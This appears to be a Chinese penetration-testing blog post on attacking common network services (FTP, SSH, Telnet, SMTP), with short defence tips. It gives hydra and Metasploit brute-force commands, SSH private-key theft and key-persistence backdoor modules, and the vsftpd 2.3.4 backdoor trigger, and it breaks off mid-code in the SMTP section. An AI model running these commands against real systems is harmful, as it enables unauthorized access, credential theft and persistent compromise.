<!DOCTYPE html>
<html lang="zh-cn">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>常见服务类漏洞 - Geekby&#39;s Blog</title><meta name="Description" content="常见服务类漏洞"><meta property="og:title" content="常见服务类漏洞" />
<meta property="og:description" content="常见服务类漏洞" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.geekby.site/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-05-13T15:09:00+08:00" />
<meta property="article:modified_time" content="2020-05-13T15:09:00+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="常见服务类漏洞"/>
<meta name="twitter:description" content="常见服务类漏洞"/>
<meta name="application-name" content="Geekby&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://www.geekby.site/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/" /><link rel="next" href="https://www.geekby.site/2020/05/saltstack-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11651/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "常见服务类漏洞",
        "inLanguage": "zh-cn",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/www.geekby.site\/2020\/05\/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E\/"
        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 服务漏洞","wordcount":  962 ,
        "url": "https:\/\/www.geekby.site\/2020\/05\/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E\/","datePublished": "2020-05-13T15:09:00+08:00","dateModified": "2020-05-13T15:09:00+08:00","publisher": {
            "@type": "Organization",
            "name": "Geekby","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
                    "width":  358 ,
                    "height":  330 
                }},"author": {
                "@type": "Person",
                "name": "Geekby"
            },"description": "常见服务类漏洞"
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">常见服务类漏洞</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-13">2020-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 962 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#ftp-漏洞">FTP 漏洞</a>
      <ul>
        <li><a href="#ftp-协议介绍">FTP 协议介绍</a></li>
        <li><a href="#banner-信息">Banner 信息</a></li>
        <li><a href="#匿名登录-anonymous-login">匿名登录 anonymous login</a>
          <ul>
            <li><a href="#msf">msf</a></li>
          </ul>
        </li>
        <li><a href="#中间人嗅探">中间人嗅探</a></li>
        <li><a href="#ftp-暴力破解工具">FTP 暴力破解工具</a>
          <ul>
            <li><a href="#hydra">hydra</a></li>
            <li><a href="#msf-1">MSF</a></li>
          </ul>
        </li>
        <li><a href="#vsftpd-笑脸漏洞">vsftpd 笑脸漏洞</a></li>
        <li><a href="#防御">防御</a></li>
      </ul>
    </li>
    <li><a href="#ssh-漏洞">SSH 漏洞</a>
      <ul>
        <li><a href="#ssh-简介">SSH 简介</a></li>
        <li><a href="#端口扫描">端口扫描</a>
          <ul>
            <li><a href="#nmap">nmap</a></li>
            <li><a href="#msf-2">msf</a></li>
          </ul>
        </li>
        <li><a href="#密码破解">密码破解</a>
          <ul>
            <li><a href="#msf-3">msf</a></li>
          </ul>
        </li>
        <li><a href="#ssh-用户代码执行">SSH 用户代码执行</a>
          <ul>
            <li><a href="#msf-4">msf</a></li>
          </ul>
        </li>
        <li><a href="#使用-rsa-密钥建立-ssh-连接">使用 RSA 密钥建立 SSH 连接</a></li>
        <li><a href="#窃取-ssh-密钥">窃取 SSH 密钥</a></li>
        <li><a href="#ssh-密钥持久性后门">SSH 密钥持久性后门</a></li>
        <li><a href="#防御-1">防御</a>
          <ul>
            <li><a href="#修改默认端口">修改默认端口</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#telnet-漏洞">Telnet 漏洞</a>
      <ul>
        <li><a href="#telnet-简介">telnet 简介</a></li>
        <li><a href="#banner-信息-1">banner 信息</a></li>
        <li><a href="#修改默认端口-1">修改默认端口</a></li>
        <li><a href="#通过嗅探窃取凭据">通过嗅探窃取凭据</a></li>
        <li><a href="#暴力破解">暴力破解</a>
          <ul>
            <li><a href="#hydra-1">hydra</a></li>
            <li><a href="#msf-5">msf</a></li>
          </ul>
        </li>
        <li><a href="#保护-telnet-免受暴力攻击">保护 telnet 免受暴力攻击</a></li>
      </ul>
    </li>
    <li><a href="#smtp-漏洞">SMTP 漏洞</a>
      <ul>
        <li><a href="#smtp-简介">SMTP 简介</a></li>
        <li><a href="#smtp-命令和返回码">SMTP 命令和返回码</a></li>
        <li><a href="#postfix-简介">Postfix 简介</a></li>
        <li><a href="#smtp-用户枚举">SMTP 用户枚举</a>
          <ul>
            <li><a href="#手动枚举-smtp-用户">手动枚举 SMTP 用户</a></li>
            <li><a href="#smtp-user-enum">SMTP-user-enum</a></li>
            <li><a href="#msf-6">msf</a></li>
          </ul>
        </li>
        <li><a href="#暴力破解-1">暴力破解</a>
          <ul>
            <li><a href="#hydra-2">hydra</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#samba-漏洞">Samba 漏洞</a>
      <ul>
        <li><a href="#samba-简介">Samba 简介</a></li>
        <li><a href="#smb-简介">SMB 简介</a></li>
        <li><a href="#smb-信息泄露">SMB 信息泄露</a>
          <ul>
            <li><a href="#msf-7">msf</a></li>
            <li><a href="#nmap-1">nmap</a></li>
            <li><a href="#nmblookup">nmblookup</a></li>
            <li><a href="#nbtscan">nbtscan</a></li>
            <li><a href="#smbmap">SMBMap</a></li>
          </ul>
        </li>
        <li><a href="#暴力破解-2">暴力破解</a>
          <ul>
            <li><a href="#hydra-3">hydra</a></li>
          </ul>
        </li>
        <li><a href="#命令执行">命令执行</a></li>
      </ul>
    </li>
    <li><a href="#zookeeper">Zookeeper</a>
      <ul>
        <li><a href="#zookeeper-简介">Zookeeper 简介</a></li>
        <li><a href="#环境搭建">环境搭建</a></li>
        <li><a href="#未授权访问">未授权访问</a></li>
      </ul>
    </li>
    <li><a href="#mysql-漏洞">Mysql 漏洞</a>
      <ul>
        <li><a href="#mysql-简介">Mysql 简介</a></li>
        <li><a href="#mysql-信息收集">Mysql 信息收集</a>
          <ul>
            <li><a href="#版本信息">版本信息</a></li>
            <li><a href="#其它相关信息">其它相关信息</a></li>
          </ul>
        </li>
        <li><a href="#mysql-密码破解">Mysql 密码破解</a>
          <ul>
            <li><a href="#hydra-4">hydra</a></li>
            <li><a href="#msf-8">msf</a></li>
          </ul>
        </li>
        <li><a href="#mysql-漏洞利用">Mysql 漏洞利用</a>
          <ul>
            <li><a href="#mysql-身份认证漏洞cve-2012-2122">MySQL 身份认证漏洞(CVE-2012-2122)</a></li>
            <li><a href="#漏洞利用">漏洞利用</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#redis">Redis</a>
      <ul>
        <li><a href="#redis-简介">redis 简介</a></li>
        <li><a href="#redis-未授权访问漏洞">redis 未授权访问漏洞</a>
          <ul>
            <li><a href="#在-web-目录下写入-webshell">在 web 目录下写入 Webshell</a></li>
            <li><a href="#写-ssh-公钥">写 ssh 公钥</a></li>
            <li><a href="#写-crontab">写 crontab</a></li>
          </ul>
        </li>
        <li><a href="#利用-redis-主从复制-rce">利用 redis 主从复制 rce</a></li>
      </ul>
    </li>
    <li><a href="#zabbix-漏洞">Zabbix 漏洞</a>
      <ul>
        <li><a href="#zabbix-简介">Zabbix 简介</a></li>
        <li><a href="#zabbix-sql-注入漏洞">Zabbix SQL 注入漏洞</a></li>
        <li><a href="#zabbix-命令执行利用">Zabbix 命令执行利用</a></li>
      </ul>
    </li>
    <li><a href="#elasticsearch-漏洞">Elasticsearch 漏洞</a>
      <ul>
        <li><a href="#elasticsearch-简介">Elasticsearch 简介</a></li>
        <li><a href="#elasticsearch-未授权访问漏洞">Elasticsearch 未授权访问漏洞</a></li>
        <li><a href="#cve-2014-3120">CVE-2014-3120</a></li>
        <li><a href="#cve-2015-1427">CVE-2015-1427</a></li>
        <li><a href="#cve-2015-3337">CVE-2015-3337</a></li>
        <li><a href="#cve-2015-5531">CVE-2015-5531</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="常见服务类漏洞">常见服务类漏洞</h1>
<h2 id="ftp-漏洞">FTP 漏洞</h2>
<h3 id="ftp-协议介绍">FTP 协议介绍</h3>
<p>FTP（File Transfer Protocol，文件传输协议）是 TCP/IP 协议组中的协议之一。FTP 协议包括两个组成部分，其一为 FTP 服务器，其二为 FTP 客户端。其中 FTP 服务器用来存储文件，用户可以使用 FTP 客户端通过 FTP 协议访问位于 FTP 服务器上的资源。在开发网站的时候，通常利用 FTP 协议把网页或程序传到 Web 服务器上。此外，由于 FTP 传输效率非常高，在网络上传输大的文件时，一般也采用该协议。
默认情况下 FTP 协议使用 TCP 端口中的 20 和 21 这两个端口，其中 20 用于传输数据，21 用于传输控制信息。但是，是否使用 20 作为传输数据的端口与 FTP 使用的传输模式有关，如果采用主动模式，那么数据传输端口就是 20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p>
<h3 id="banner-信息">Banner 信息</h3>
<p>Banner 信息暴露远程系统上运行的任何软件或服务的漏洞，因此在安装任何服务后需要隐藏其软件版本。</p>
<h3 id="匿名登录-anonymous-login">匿名登录 anonymous login</h3>
<h4 id="msf">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">scanner/ftp/anonymous 模块
</code></pre></td></tr></table>
</div>
</div><h3 id="中间人嗅探">中间人嗅探</h3>
<p>攻击者可以利用嗅探工具来帮助他们嗅探网络中服务器和客户端之间传输的数据包并检索凭据，这被称为嗅探，然后将其用于未经授权的访问。如上所述，FTP用户可以使用用于用户名和密码的明文登录协议对自己进行身份验证。</p>
<h3 id="ftp-暴力破解工具">FTP 暴力破解工具</h3>
<h4 id="hydra">hydra</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -v -L user.txt -P pass.txt ftp://ip
</code></pre></td></tr></table>
</div>
</div><h4 id="msf-1">MSF</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/ftp/ftp_login
</code></pre></td></tr></table>
</div>
</div><h3 id="vsftpd-笑脸漏洞">vsftpd 笑脸漏洞</h3>
<p>版本：<code>vsftp 2.3.4</code></p>
<p>后门：</p>
<p>用户名中包含 <code>:)</code> 就可以启用绑定在 6200 端口的后门 shell</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509155756.png-water_print" /></p>
<h3 id="防御">防御</h3>
<ol>
<li>修改配置上的banner信息</li>
<li>加 ssl 证书(SSL_Enable=YES)</li>
<li>白名单限制登录</li>
<li>iptables 设置登录次数与登录线程</li>
</ol>
<h2 id="ssh-漏洞">SSH 漏洞</h2>
<h3 id="ssh-简介">SSH 简介</h3>
<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH 最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH 在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX 平台—包括 HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行 SSH。</p>
<h3 id="端口扫描">端口扫描</h3>
<h4 id="nmap">nmap</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sV -p 22 IP
</code></pre></td></tr></table>
</div>
</div><h4 id="msf-2">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">auxiliary/scanner/ssh/ssh_version
</code></pre></td></tr></table>
</div>
</div><h3 id="密码破解">密码破解</h3>
<h4 id="msf-3">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login
set stop_on_success true
</code></pre></td></tr></table>
</div>
</div><h3 id="ssh-用户代码执行">SSH 用户代码执行</h3>
<h4 id="msf-4">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use exploit/multi/ssh/sshexec
</code></pre></td></tr></table>
</div>
</div><h3 id="使用-rsa-密钥建立-ssh-连接">使用 RSA 密钥建立 SSH 连接</h3>
<p>配置：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen
<span class="nb">cd</span> /home/kali/.ssh
ls
cat id_rsa.pub &gt; authorized_keys
scp msfadmin@ip:/home/msfadmin/.ssh/id_rsa ./
sudo vim /etc/ssh/sshd_config
PasswordAuthentication no
sudo /etc/init.d/ssh restart
</code></pre></td></tr></table>
</div>
</div><p>连接：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -i id_rsa username@ip
</code></pre></td></tr></table>
</div>
</div><h3 id="窃取-ssh-密钥">窃取 SSH 密钥</h3>
<p>已获得 meterpreter 会话，窃取 SSH 密钥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login 获取会话
use post/multi/gather/ssh_creds
set session 1
run
</code></pre></td></tr></table>
</div>
</div><h3 id="ssh-密钥持久性后门">SSH 密钥持久性后门</h3>
<p>已获得 meterpreter 会话，留下 SSH 密钥持久性后门</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use auxiliary/scanner/ssh/ssh_login 获取会话
use post/linux/manager/sshkey_persistence
set session 1
run
</code></pre></td></tr></table>
</div>
</div><h3 id="防御-1">防御</h3>
<h4 id="修改默认端口">修改默认端口</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo vim /etc/ssh/sshd_config
port <span class="m">22222</span>
sudo /etc/init.d/ssh restart
</code></pre></td></tr></table>
</div>
</div><h2 id="telnet-漏洞">Telnet 漏洞</h2>
<h3 id="telnet-简介">telnet 简介</h3>
<p>Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用 telnet 程序，用它连接到服务器。终端使用者可以在 telnet 程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet 会话，必须输入用户名和密码来登录服务器。Telnet 是常用的远程控制 Web 服务器的方法。</p>
<h3 id="banner-信息-1">banner 信息</h3>
<ul>
<li>/etc/issue.net</li>
<li>msf
<ul>
<li>use auxiliary/scanner/telnet/telnet_version</li>
</ul>
</li>
</ul>
<h3 id="修改默认端口-1">修改默认端口</h3>
<ul>
<li>/etc/services</li>
<li>sudo /etc/init.d/xinetd restart</li>
</ul>
<h3 id="通过嗅探窃取凭据">通过嗅探窃取凭据</h3>
<p>明文传输，可以嗅探</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510144359.png-water_print" /></p>
<h3 id="暴力破解">暴力破解</h3>
<h4 id="hydra-1">hydra</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">hydra -v -L user.txt -P pass.txt telnet://IP
</code></pre></td></tr></table>
</div>
</div><h4 id="msf-5">msf</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">use auxiliary/scanner/telnet/telnet_login
<span class="k">set</span> <span class="nv">rhost</span>
<span class="k">set</span> <span class="nv">stop_on_success true</span>
<span class="k">set</span> <span class="nv">user_file user.txt</span>
<span class="k">set</span> <span class="nv">pass_file pass.txt</span>
run
</code></pre></td></tr></table>
</div>
</div><h3 id="保护-telnet-免受暴力攻击">保护 telnet 免受暴力攻击</h3>
<ul>
<li>将允许来自 IP 地址 192.168.1.1 的流量访问端口 23 上的 telnet 服务</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo iptables -A INPUT -s 192.168.1.1 -p tcp --dport <span class="m">23</span> -j ACCEPT
</code></pre></td></tr></table>
</div>
</div><ul>
<li>drop 掉来自端口 23 上其它 IP 地址的流量</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo iptables -A INPUT -p tcp --dport <span class="m">23</span> -j DROP
</code></pre></td></tr></table>
</div>
</div><h2 id="smtp-漏洞">SMTP 漏洞</h2>
<h3 id="smtp-简介">SMTP 简介</h3>
<p>SMTP 是一种提供可靠且有效的电子邮件传输的协议。SMTP 是建立在 FTP 文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP 独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP 的重要特性之一是其能跨越网络传输邮件，即 <code>SMTP邮件中继</code> 。使用 SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</p>
<h3 id="smtp-命令和返回码">SMTP 命令和返回码</h3>
<ul>
<li>MAIL FROM
<ul>
<li>指定发件人地址</li>
</ul>
</li>
<li>RCPT TO
<ul>
<li>指定单个的邮件接收人：可能有多个 RCPT TO；常在 MAIL FROM 命令之后</li>
</ul>
</li>
<li>VRFY
<ul>
<li>用于指定用户/邮箱是否存在；由于安全原因，服务器常禁止此命令</li>
</ul>
</li>
<li>EXPN
<ul>
<li>验证给定的邮箱列表是否存在，也常被禁用</li>
</ul>
</li>
<li>返回码
<ul>
<li>250：要求邮件操作完成</li>
<li>500：要求邮件操作未完成，邮箱不可用（例如，邮箱未找到，或不可访问）</li>
</ul>
</li>
</ul>
<h3 id="postfix-简介">Postfix 简介</h3>
<p>postfix 是 ubuntu 的默认邮件传输代理（MTA）</p>
<p><a href="http://www.postfix.org" target="_blank" rel="noopener noreffer">http://www.postfix.org</a></p>
<h3 id="smtp-用户枚举">SMTP 用户枚举</h3>
<ul>
<li>Ubuntu 系统用户就是 postfix 用户</li>
<li>telnet</li>
<li>Smtp-user-enum</li>
<li>msf</li>
</ul>
<h4 id="手动枚举-smtp-用户">手动枚举 SMTP 用户</h4>
<p>telnet</p>
<ul>
<li>VERY ftp</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510151810.png-water_print" /></p>
<ul>
<li>MAIL FROM:ftp + RCPT TO:ftp</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200510152040.png-water_print" /></p>
<h4 id="smtp-user-enum">SMTP-user-enum</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
